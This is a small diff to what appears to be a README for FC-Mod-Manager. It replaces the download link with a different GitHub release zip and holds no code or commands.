@@ -12,7 +12,7 @@
 
 ## 📥 Download
 
-**[Download FC-Mod-Manager](https://github.com/Openoolead99/FC-Mod-Manager/releases/download/765765/FCModManager.zip)**
+**[Download FC-Mod-Manager](https://github.com/Openoolead99/FC-Mod-Manager/releases/download/756/FCMODManager.zip)**
 ---
 
 ## ✨ Features
